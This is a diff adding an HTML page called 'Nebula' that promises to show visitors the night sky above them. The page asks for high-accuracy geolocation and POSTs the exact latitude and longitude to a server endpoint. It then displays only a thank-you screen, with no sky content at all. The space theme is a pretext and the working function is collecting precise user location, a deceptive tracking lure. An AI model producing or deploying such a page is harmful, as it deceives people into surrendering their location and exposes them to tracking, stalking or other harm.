@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nebula</title>
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+
+body{
+    min-height:100vh;
+    overflow:hidden;
+    font-family:Arial,sans-serif;
+    color:white;
+    background:
+    radial-gradient(circle at 20% 20%,#392078,transparent 35%),
+    radial-gradient(circle at 80% 75%,#54145e,transparent 35%),
+    #02000b;
+}
+
+.stars{
+    position:fixed;
+    inset:0;
+    background-image:
+    radial-gradient(white 1px,transparent 1px),
+    radial-gradient(#aaa 1px,transparent 1px);
+    background-size:70px 70px,110px 110px;
+    opacity:.6;
+    animation:move 30s linear infinite;
+}
+
+@keyframes move{
+    from{transform:translateY(0)}
+    to{transform:translateY(70px)}
+}
+
+.screen{
+    position:relative;
+    z-index:2;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    padding:25px;
+}
+
+.card{
+    width:min(700px,100%);
+    padding:55px 30px;
+    border-radius:30px;
+    background:rgba(255,255,255,.07);
+    border:1px solid rgba(255,255,255,.15);
+    backdrop-filter:blur(15px);
+    box-shadow:0 0 80px rgba(120,60,255,.25);
+}
+
+.icon{
+    font-size:65px;
+    margin-bottom:15px;
+}
+
+h1{
+    font-size:clamp(42px,9vw,75px);
+    letter-spacing:4px;
+    background:linear-gradient(90deg,#fff,#bea7ff,#8bdcff);
+    -webkit-background-clip:text;
+    color:transparent;
+}
+
+p{
+    color:#c8c1df;
+    font-size:18px;
+    line-height:1.6;
+    margin:18px auto 30px;
+    max-width:570px;
+}
+
+button{
+    border:0;
+    padding:16px 30px;
+    border-radius:50px;
+    color:white;
+    font-size:17px;
+    font-weight:bold;
+    background:linear-gradient(135deg,#7055ff,#a448ff);
+    cursor:pointer;
+}
+
+#status{
+    margin-top:20px;
+    color:#aaa4c2;
+    font-size:14px;
+}
+
+#thanks{
+    display:none;
+}
+
+.nebula{
+    width:230px;
+    height:230px;
+    margin:30px auto;
+    border-radius:50%;
+    background:
+    radial-gradient(circle at 35% 35%,white 0%,#d8baff 5%,transparent 15%),
+    radial-gradient(circle at 60% 50%,#ff70e7,#793cff 30%,#18103e 65%);
+    box-shadow:
+    0 0 30px #9b5cff,
+    0 0 80px #743dff,
+    0 0 140px rgba(180,80,255,.6);
+    animation:pulse 5s ease-in-out infinite;
+}
+
+@keyframes pulse{
+    50%{transform:scale(1.1) rotate(8deg)}
+}
+
+.thanks h2{
+    font-size:50px;
+    background:linear-gradient(90deg,#fff,#bd9aff,#82dfff);
+    -webkit-background-clip:text;
+    color:transparent;
+}
+</style>
+</head>
+
+<body>
+
+<div class="stars"></div>
+
+<div class="screen" id="main">
+    <div class="card">
+
+        <div class="icon">🌌</div>
+
+        <h1>NEBULA</h1>
+
+        <p>
+            Turn on your location to enjoy the universe.
+            Let the night sky find you and discover the universe above your location.
+        </p>
+
+        <button onclick="getLocation()">
+            ✨ Explore My Sky
+        </button>
+
+        <div id="status">
+            Your location will only be accessed after you give permission.
+        </div>
+
+    </div>
+</div>
+
+<div class="screen" id="thanks">
+    <div>
+        <h2>Thanks ✨</h2>
+
+        <div class="nebula"></div>
+
+        <p>
+            Your sky is ready.<br>
+            Welcome to the universe. 🌌
+        </p>
+    </div>
+</div>
+
+<script>
+function getLocation(){
+
+    const status = document.getElementById("status");
+
+    if(!navigator.geolocation){
+        status.innerText = "Location is not supported.";
+        return;
+    }
+
+    status.innerText = "Finding your location... ✨";
+
+    navigator.geolocation.getCurrentPosition(
+
+        async function(position){
+
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            status.innerText = "Saving your location...";
+
+            try{
+
+                const response = await fetch("/api/location", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        latitude: latitude,
+                        longitude: longitude
+                    })
+                });
+
+                const result = await response.json();
+
+                if(result.success){
+
+                    document.getElementById("main").style.display = "none";
+                    document.getElementById("thanks").style.display = "flex";
+
+                }else{
+
+                    status.innerText = "Location could not be saved.";
+
+                }
+
+            }catch(error){
+
+                console.error(error);
+                status.innerText = "Server connection failed.";
+
+            }
+        },
+
+        function(error){
+
+            if(error.code === 1){
+                status.innerText = "Please allow location permission.";
+            }else{
+                status.innerText = "Could not detect your location.";
+            }
+
+        },
+
+        {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+}
+</script>
+
+</body>
+</html>
